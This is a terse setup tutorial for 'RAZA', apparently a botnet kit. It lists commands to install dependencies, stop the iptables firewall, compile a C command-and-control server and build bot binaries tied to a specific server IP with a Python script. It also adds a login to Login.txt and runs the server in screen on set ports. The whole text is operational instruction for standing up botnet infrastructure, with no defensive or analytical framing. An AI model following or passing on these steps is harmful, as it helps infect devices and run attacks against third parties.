Tut Made My RAZA
----------------------------
Put server Ip in bot_RAZA.c						 
--------------------------------------------------------------------
yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
--------------------------------------------------------------------
service httpd restart 
service iptables stop
--------------------------------------------------------------------
gcc raza.c -o server -pthread
--------------------------------------------------------------------
python RAZA.py bot_RAZA.c 51.89.62.246  (Server IP)
--------------------------------------------------------------------
echo raza raza >>Login.txt
------------------------------
screen ./server 1111 1 8882
------------------------------
If Doesn't Screen
------------------------------
yum install screen
------------------------------
pkill screen
------------------------------
screen ./server 1111 1 8882
